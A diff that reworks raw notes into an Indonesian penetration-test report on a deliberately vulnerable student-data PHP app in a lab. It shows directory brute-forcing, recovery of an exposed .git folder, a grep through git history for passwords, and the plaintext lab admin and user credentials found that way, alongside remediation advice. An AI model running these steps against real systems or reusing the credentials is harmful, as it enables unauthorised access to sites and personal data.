@@ -1,537 +1,760 @@
-# General
+# LAPORAN PENTEST — Aplikasi Management Data Siswa
 
-## Mapping
+- **Target:** `http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/`
+- **Setup Lab:** Aplikasi berjalan di **Windows (Laragon)**, Attacker di **Kali Linux**
+- **Tanggal:** 21–22 September 2026
+- **Tester:** gh0st4n
+- **Metodologi:** Black-box → White-box (setelah recovery source code via `.git`)
 
+## Daftar Isi
+
+- [LAPORAN PENTEST - Aplikasi Management Data Siswa](#laporan-pentest--aplikasi-management-data-siswa)
+  - [Daftar Isi](#daftar-isi)
+  - [1. Ringkasan Eksekutif](#1-ringkasan-eksekutif)
+  - [2. Lingkup \& Setup Lab](#2-lingkup--setup-lab)
+  - [3. Metodologi \& Reconnaissance](#3-metodologi--reconnaissance)
+    - [Tools](#tools)
+    - [Reconnaissance](#reconnaissance)
+  - [4. Temuan](#4-temuan)
+    - [4.1 Git Repository Exposure (CRITICAL)](#41-git-repository-exposure-critical)
+    - [4.2 Credential Leak di Git History (CRITICAL)](#42-credential-leak-di-git-history-critical)
+    - [4.3 Database Dump Ke-commit (HIGH)](#43-database-dump-ke-commit-high)
+    - [4.4 Directory Listing Aktif (MEDIUM)](#44-directory-listing-aktif-medium)
+    - [4.5 Session Hijacking via HTTP (MEDIUM)](#45-session-hijacking-via-http-medium)
+    - [4.6 Business Logic - Validasi NISN (LOW)](#46-business-logic--validasi-nisn-low)
+  - [5. Vektor yang Diuji \& Aman](#5-vektor-yang-diuji--aman)
+  - [6. Matriks Risiko](#6-matriks-risiko)
+  - [7. Rekomendasi Perbaikan](#7-rekomendasi-perbaikan)
+    - [Prioritas 1 (Immediate)](#prioritas-1-immediate)
+    - [Prioritas 2 (Short-term)](#prioritas-2-short-term)
+    - [Prioritas 3 (Long-term)](#prioritas-3-long-term)
+  - [8. Panduan Aman Push ke GitHub](#8-panduan-aman-push-ke-github)
+    - [8.1 Buat `.gitignore` yang Proper](#81-buat-gitignore-yang-proper)
+    - [8.2 Gunakan Environment Variable](#82-gunakan-environment-variable)
+    - [8.3 Scan Credential Sebelum Push](#83-scan-credential-sebelum-push)
+    - [8.4 Pre-commit Hook - Cegah Commit Credential](#84-pre-commit-hook--cegah-commit-credential)
+    - [8.5 Kalau Sudah Terlanjur Commit - Bersihkan History](#85-kalau-sudah-terlanjur-commit--bersihkan-history)
+    - [8.6 Gunakan GitHub Secrets untuk CI/CD](#86-gunakan-github-secrets-untuk-cicd)
+    - [8.7 Checklist Sebelum Push](#87-checklist-sebelum-push)
+    - [8.8 Alur Push yang Benar](#88-alur-push-yang-benar)
+    - [8.9 Emergency Response - Kalau Credential Bocor](#89-emergency-response--kalau-credential-bocor)
+  - [9. Lampiran](#9-lampiran)
+    - [A. Command yang Digunakan](#a-command-yang-digunakan)
+    - [B. Timeline](#b-timeline)
+    - [C. Struktur File yang Ter-recover](#c-struktur-file-yang-ter-recover)
+    - [D. Referensi](#d-referensi)
+
+## 1. Ringkasan Eksekutif
+
+Aplikasi **Management Data Siswa** memiliki **2 temuan Critical**, **1 High**, **2 Medium**, dan **1 Low**. Temuan paling berdampak adalah **eksposur folder `.git`** yang memungkinkan penyerang mengambil **seluruh source code** dan **credential admin** dari **git history**.
+
+Dengan credential yang didapat, penyerang bisa **login sebagai admin** dan mengakses seluruh fungsi aplikasi. Meskipun aplikasi sudah menerapkan **prepared statement**, **CSRF token**, **role-based access control**, dan **whitelist ekstensi upload** dengan baik, **kebocoran source code & credential** membuat pertahanan tersebut menjadi tidak relevan.
+
+**Catatan penting:** Setup lab ini **sengaja** dibuat rentan untuk keperluan pembelajaran. Di lingkungan production, konfigurasi seperti ini **tidak boleh** terjadi.
+
+**Prioritas perbaikan:**
+1. Blokir akses ke `.git` di web server (Production)
+2. Rotasi seluruh password
+3. Hapus git history yang mengandung credential (Production)
+4. Nonaktifkan directory listing
+5. Gunakan HTTPS + flag `Secure`/`HttpOnly` pada cookie
+6. Terapkan praktik aman push ke GitHub (lihat [Bagian 8](#8-panduan-aman-push-ke-github))
+
+## 2. Lingkup & Setup Lab
+
+| Komponen       | Detail                                             |
+|----------------|----------------------------------------------------|
+| **Aplikasi**   | Management Data Siswa (PHP + MySQL)                |
+| **Web Server** | Laragon (Windows)                                  |
+| **Target IP**  | `192.168.100.247`                                  |
+| **Attacker**   | Kali Linux (VM)                                    |
+| **Jaringan**   | Bridged / Host-Only (satu subnet `192.168.100.x`)  |
+| **Scope**      | `http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/` |
+
+**Catatan:** Karena attacker & victim berada di **satu jaringan**, sniffing HTTP (tanpa TLS) menjadi **realistis** dan **valid** untuk diuji.
+
+## 3. Metodologi & Reconnaissance
+
+### Tools
+- `feroxbuster` - directory brute-force
+- `git-dumper` - recovery `.git`
+- `exiftool` - analisis file
+- `Wireshark` - sniffing cookie
+- `curl` / browser - manual testing
+
+### Reconnaissance
 ```bash
-┌──(gh0st4n㉿Gh0sT4n)-[~]
-└─$ feroxbuster -u http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina -w /usr/share/wordlists/dirb/common.txt
-                                                                                                                                                                                             
- ___  ___  __   __     __      __         __   ___
-|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
-|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben "epi" Risher 🤓                 ver: 2.13.1
-───────────────────────────┬──────────────────────
- 🎯  Target Url            │ http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina
- 🚩  In-Scope Url          │ 192.168.100.247
- 🚀  Threads               │ 50
- 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
- 👌  Status Codes          │ All Status Codes!
- 💥  Timeout (secs)        │ 7
- 🦡  User-Agent            │ feroxbuster/2.13.1
- 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
- 🔎  Extract Links         │ true
- 🏁  HTTP methods          │ [GET]
- 🔃  Recursion Depth       │ 4
-───────────────────────────┴──────────────────────
- 🏁  Press [ENTER] to use the Scan Management Menu™
-──────────────────────────────────────────────────
-403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-301      GET        7l       20w      256c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/
-200      GET        1l        2w       21c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/HEAD
-200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/siswa.php
-200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/database.php
-200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/kelas.php
-301      GET        7l       20w      263c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/config => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/config/
-200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/config/database.php
-301      GET        7l       20w      261c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/note => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/note/
-200      GET       84l      552w    10244c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/note/note.md
-301      GET        7l       20w      264c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/
-200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/auth.php
-200      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/guru.php
-301      GET        7l       20w      264c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/
-200      GET      282l     2264w   120497c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/cdc14326c06cfd2e1611dff0804cb576.jpg
-200      GET      216l     1343w    98731c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/e519dd68c7733e268bdede08fd4abf45.jpg
-302      GET        0l        0w        0c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/index.php => login.php
-200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_28_20260921_032324.jpg
-200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_28_20260921_034816.jpg
-200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_6_20260921_035020.jpg
-200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_15_20260921_035111.jpg
-200      GET      401l     2316w   160728c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/af9cf171086b492903c0fea27c8e1845.jpg
-200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_15_20260921_035047.jpg
-200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_19_20260921_034925.jpg
-200      GET      306l     1647w   115870c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/212d673f353f7904a7250db57f302d92.jpg
-200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_16_20260921_034944.jpg
-200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_7_20260921_035020.jpg
-200      GET      243l     1509w   103645c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/1789546244_6aaa4f049aec3.jpg
-200      GET      318l     1930w   138693c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/276d5660cbb3f5a11024dff04878b9e0.jpeg
-200      GET      302l     1899w   143529c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/ce01115f4f98ea093fd509046fb1b456.jpg
-200      GET      239l      852w    98771c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/1b450deec089582a665ae3e85e4f5d5e.jpeg
-200      GET      363l     2098w   150079c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/e4f9d327ea16725bcb6d9c754f462f05.jpg
-200      GET     2044l     5228w   383187c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/b837f3404e78e111b4fd75741d7a6285.jpg
-200      GET      306l     1647w   115870c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/1a7fba4d8bcc3f77da36b120052df75b.jpg
-200      GET      401l     2316w   160728c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/555de99c868b1f353d4bd5641746af07.jpg
-200      GET      345l     2025w   148430c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/f2e47d703d3978b5b7eec031737e4627.jpg
-200      GET      306l     1647w   115870c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/aa6513ab2e5986218f4c887320247c1f.jpg
-200      GET     6821l    40034w  3330989c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/1789817894_6aae7426498e5.png
-200      GET     5361l    33289w  2666869c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/5133eee0707cb10e39d582ea6a9f4858.png
-200      GET     6967l    39254w  3239035c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/6127b976c49acee7f155432a9d63210c.png
-200      GET     5582l    33287w  2729655c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/7616c863f24331391d1a8978bb718abd.png
-200      GET     4314l    25485w  2018663c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/106c3f4cc1c88aa9dd50107edd0a122b.png
-301      GET        7l       20w      262c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views => http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views/
-200      GET       13l       42w      466c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views/footer.php
-200      GET       46l      133w     2191c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views/header.php
-200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_19_20260921_034852.jpg
-200      GET      125l      723w    61969c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/surat_18_20260921_035131.jpg
-200      GET     5845l    34783w  2902236c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/5c7c3cab284f784a08c4edf01942a37d.png
-200      GET      345l     2025w   148430c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/b616cc1dbd113b3ebf820d6496722c49.jpg
-200      GET      306l     1647w   115870c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/4b36dc4e7a76bdf28422d90f6a36e0b5.jpg
-200      GET      335l     1882w   135330c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/1c2f7b79a39c0818d05ed93f9d4fb87d.jpg
-200      GET      419l     2056w   144258c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/ba6197bf7467607be080d9826c8f672c.jpg
-200      GET     5784l    34077w  2778511c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/250082325e068830a693971758541954.png
-200      GET     5976l    35325w  2853547c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/e55209c72f4e9d52f6c326d5d06000e0.png
-200      GET     4847l    29121w  2343561c http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/9452ff378482bfda968768b821179867.png
-[####################] - 10s     4683/4683    0s      found:44      errors:0      
-[####################] - 7s      4614/4614    704/s   http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/ 
-[####################] - 1s      4614/4614    4591/s  http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/ => Directory listing (add --scan-dir-listings to scan)
-[####################] - 0s      4614/4614    200609/s http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/config/ => Directory listing (add --scan-dir-listings to scan)
-[####################] - 0s      4614/4614    354923/s http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/note/ => Directory listing (add --scan-dir-listings to scan)
-[####################] - 8s      4614/4614    588/s   http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/ => Directory listing (add --scan-dir-listings to scan)
-[####################] - 5s      4614/4614    907/s   http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/surat_dokter/ => Directory listing (add --scan-dir-listings to scan)
-[####################] - 0s      4614/4614    384500/s http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views/ => Directory listing (add --scan-dir-listings to scan) 
+feroxbuster -u http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina \
+  -w /usr/share/wordlists/dirb/common.txt
 ```
 
-## TEMUAN 1 : Git Repository Expore (CRITICAL)
-### Apa Yang Ditemukan ?
-Folder `.git` meng-ekspose informasi :
-
-```bash
-http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/
+**Hasil menarik:**
+```
+200  .git/HEAD                          → Git exposed
+200  config/database.php                → Config DB
+200  note/note.md                       → Catatan dev
+200  classes/auth.php                   → Logika auth
+200  classes/siswa.php
+200  classes/guru.php
+200  classes/kelas.php
+301  uploads/                           → Directory listing
+301  config/                            → Directory listing
+301  note/                              → Directory listing
+301  classes/                           → Directory listing
+301  views/                             → Directory listing
 ```
 
-### Cara Eksploitasi
+## 4. Temuan
 
+### 4.1 Git Repository Exposure (CRITICAL)
+
+**Deskripsi:**
+Folder `.git` dapat diakses publik via HTTP, memungkinkan recovery source code lengkap. Laragon (default) tidak memblokir akses ke `.git`.
+
+**URL:** `http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/`
+
+**Proof of Concept:**
 ```bash
 git-dumper http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ ./hasil-git
 
-┌──(gh0st4n㉿Gh0sT4n)-[~]
-└─$ git-dumper http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ ./hasil-git
 [-] Testing http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/HEAD [200]
-[-] Testing http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ [200]
 [-] Fetching .git recursively
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.gitignore [404]
-[-] http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.gitignore responded with status code 404
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/HEAD [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/description [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/config [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/index [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/packed-refs [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/info/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/info/exclude [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/applypatch-msg.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/post-update.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-applypatch.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/tags/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-merge-commit.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/heads/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-receive.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/commit-msg.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/HEAD [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/heads/main [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/fsmonitor-watchman.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/info/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/origin/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/heads/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-commit.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.rev [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/origin/HEAD [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-rebase.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/heads/main [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/origin/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/origin/HEAD [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-push.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/sendemail-validate.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/prepare-commit-msg.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/push-to-checkout.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/update.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.idx [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.pack [200]
-[-] Sanitizing .git/config
+...
 [-] Running git checkout .
 Updated 65 paths from the index
 ```
 
-### Dampak
-- **Source code lengkap** (65 file) ke-recover
-- **Git history** bisa dibaca → credential yang dihapus masih ada
-- **File SQL dump** (`db_management_data_siswa.sql`) ke-commit
+**Hasil:**
+- **65 file** source code ter-recover
+- Termasuk `config/database.php`, `classes/auth.php`, `db_management_data_siswa.sql`
 
-## TEMUAN 2 : Credential Leak di Git History(CRITICAL)
-### Apa Yang Ditemukan ?
-Dari `git log -p`, ketemu file `fix.php` yang dihapus di commit `54cffb3`, tapi **plaintext password masih ada di history**:
+**Dampak:**
+- Source code lengkap terekspos → memudahkan analisis kerentanan
+- Git history bisa dibaca → credential yang dihapus masih ada
+- File SQL dump ikut terekspos
 
+**Severity:** 🔴 **CRITICAL** (CVSS 9.1)
+
+**Remediasi:**
+```apache
+# Laragon / Apache .htaccess
+RedirectMatch 404 /\.git
 ```
+Atau di Nginx:
+```nginx
+location ~ /\.git { deny all; }
+```
+
+### 4.2 Credential Leak di Git History (CRITICAL)
+
+**Deskripsi:**
+File `fix.php` dihapus di commit `54cffb3` ("Hapus file skrip pemulihan fix.php demi keamanan"), tapi **plaintext password masih tersimpan di git history**.
+
+**Proof of Concept:**
+```bash
+git log -p --all | grep -iE "password|secret"
+```
+
+**Output:**
+```php
 $passAdmin = password_hash('kalinadmin08', PASSWORD_BCRYPT);
 $passUser  = password_hash('user99887711', PASSWORD_BCRYPT);
+echo "<p>Password Admin: <b>kalinadmin08</b></p>";
+echo "<p>Password User: <b>user99887711</b></p>";
 ```
 
-### Proses
+**Credential yang Didapat:**
 
-```
-cd hasil-git
-ls -la
-find . -type f -name "*.php" | head -50
-```
+| Role  | Username | Password       | Status         |
+|-------|----------|----------------|----------------|
+| Admin | `admin`  | `kalinadmin08` | Login berhasil |
+| User  | `user`   | `user99887711` | Valid          |
 
-Cek juga history commit - kadang ada credential yang dihapus tapi masih ada di history:
-
-```
-git log --oneline --all
-git log -p --all | grep -iE "password|passwd|secret|api_key|token|db_pass"
-```
-
-```bash
-┌──(gh0st4n㉿Gh0sT4n)-[~]
-└─$ git-dumper http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ ./hasil-git
-[-] Testing http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/HEAD [200]
-[-] Testing http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ [200]
-[-] Fetching .git recursively
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.gitignore [404]
-[-] http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.gitignore responded with status code 404
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/HEAD [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/description [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/config [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/index [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/packed-refs [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/info/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/info/exclude [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/applypatch-msg.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/post-update.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-applypatch.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/tags/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-merge-commit.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/heads/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-receive.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/commit-msg.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/HEAD [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/heads/main [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/fsmonitor-watchman.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/info/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/origin/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/heads/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-commit.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.rev [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/refs/remotes/origin/HEAD [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-rebase.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/heads/main [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/origin/ [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/logs/refs/remotes/origin/HEAD [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/pre-push.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/sendemail-validate.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/prepare-commit-msg.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/push-to-checkout.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/hooks/update.sample [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.idx [200]
-[-] Fetching http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/objects/pack/pack-7558c0f7d2b2c2b3c5578e37b4bf07d73518b29a.pack [200]
-[-] Sanitizing .git/config
-[-] Running git checkout .
-Updated 65 paths from the index
-```
-
-#### Langkah Selanjutnya :
-
-```bash
-cd hasil-git
-ls -la
-find . -type f -name "*.php" | head -50
-```
-
-Cek juga history commit - kadang ada credential yang dihapus tapi masih ada di history:
-
-```bash
-git log --oneline --all
